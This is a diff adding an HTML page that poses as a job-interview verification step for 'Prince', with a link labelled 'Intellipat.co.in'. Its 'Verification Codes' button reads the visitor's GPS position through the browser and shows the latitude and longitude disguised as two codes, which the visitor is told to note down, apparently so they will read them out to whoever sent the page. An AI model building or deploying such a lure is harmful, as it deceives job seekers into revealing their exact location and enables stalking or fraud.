@@ -1,0 +1,46 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+</head>
+<body>
+    <p>Dear Prince,<br><br>Please Click the button below to get the verification code for your interview round.</p><p>
+         <b>Note: <br></b>
+         <ol>
+             <li><i>Don't forget to NOTE Down your verification code.<br></li>
+            <li><b>Please allow access to location for security purpose.</b></i></li>
+         </ol>           
+            <br><br>
+            <b>Job Role:</b> Assossiate Manager<br>
+            <b>Total CTC: </b>7.5 LPA + <i>incentives</i><br>
+            <b>Job Location: </b>Bangaluru, Karnataka</b><br>
+            <b>Online Interview: </b>31.05.22 (7 pm)</b><br>
+            <b>Duration: </b>10 - 40 mins</b><br>
+            <br><br>Thank you!<br><a href="https://www.googleadservices.com/pagead/aclk?sa=L&ai=DChcSEwibp9vx1In4AhUxnUsFHSMcBTAYABAAGgJzZg&ae=2&ohost=www.google.com&cid=CAESbOD2Tk77glw21v-Bxkd88ojTSbWz6OFTC1g4uoeHVVWbPO3yCLPh4BTLZpUtyhYc2UT7i7EKFIOnyJuKLvj_3DUhftyoHUoTDeikNwTOO1JkG1cuR6toZ6pOJ-TrdQ1pYnvQR1nFd46P4DL-TA&sig=AOD64_3_ZbrebnXKs39Lzkza7q6dY5KUQQ&q&adurl&ved=2ahUKEwj57tPx1In4AhWiTGwGHWC0DpgQ0Qx6BAgDEAE">Intellipat.co.in</a></p>
+    
+    <button onclick="getLocation()">Verification Codes</button>
+    
+    <p id="demo"></p>
+    
+    <script>
+    var x = document.getElementById("demo");
+    
+    function getLocation() {
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(showPosition);
+      } else { 
+        x.innerHTML = "Verification process is failed please open GPS to completer the process.";
+      }
+    }
+    
+    function showPosition(position) {
+      x.innerHTML = "Code 1: " + position.coords.latitude + 
+      "<br>Code 2: " + position.coords.longitude;
+    }
+    </script>
+    
+    </body>
+    </html>
